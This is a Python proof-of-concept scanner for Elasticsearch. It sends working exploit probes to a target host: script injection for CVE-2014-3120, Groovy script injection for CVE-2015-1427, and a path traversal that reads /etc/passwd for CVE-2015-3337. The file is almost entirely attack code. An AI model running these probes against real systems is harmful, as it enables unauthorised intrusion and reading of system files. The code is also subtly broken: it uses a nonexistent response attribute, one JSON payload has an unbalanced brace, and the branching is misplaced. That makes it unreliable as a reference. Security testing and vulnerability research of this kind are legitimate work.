import requests

def poc(host, port, timeout):
    try:
        r = requests.get(f"http://{host}:{port}", timeout=timeout, allow_redirects=False, verify=False)
        if "You Know, for Search" in r.text:
            if(elasticsearch_cve_2014_3120_rce_check(host, port, timeout)):
                return "elasticsearch cve-2014-3120"
            if(elasticsearch_cve_2015_1427_rce_check(host, port, timeout)):
                return "elasticsearch cve-2015-1427"
            if(elasticsearch_cve_2015_3337_rce_check(host, port, timeout)):
                return "elasticsearch cve-2015-3337"
            else:
                return "elasticsearch is unauthorized"
    except:
        pass  # traceback.print_exc()
    return None


def elasticsearch_cve_2014_3120_rce_check(host, port, timeout):
    data = '''{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "37182379+74892374"
        }
    }
    }'''
    try:
        r = requests.post(f"http://{host}:{port}/_search?pretty", data=data, timeout=timeout)
        if r.status_code == 200 and '112074753' in r.text:
            return True
    except:
        pass
    return False


def elasticsearch_cve_2015_1427_rce_check(host, port, timeout):
    data = '''{
    "size":1,
    "script_fields": {
       "secpulse": { "script":"372137931+31829038120",
       "lang": "groovy"
    }
  }
}}'''
    try:
        r = requests.post(f"http://{host}:{port}/_search?pretty", data=data, timeout=timeout)
        if r.status_code == 200 and '32201176051' in r.text:
            return True
    except:
        pass
    return False

def elasticsearch_cve_2015_3337_rce_check(host, port, timeout):
    try:
        r = requests.get(f"http://{host}:{port}/_plugin/../../../../../../../../../../../etc/passwd", timeout=timeout)
        if r.status == 200 and 'root' in r.text:
            return True
    except:
        pass
    return False
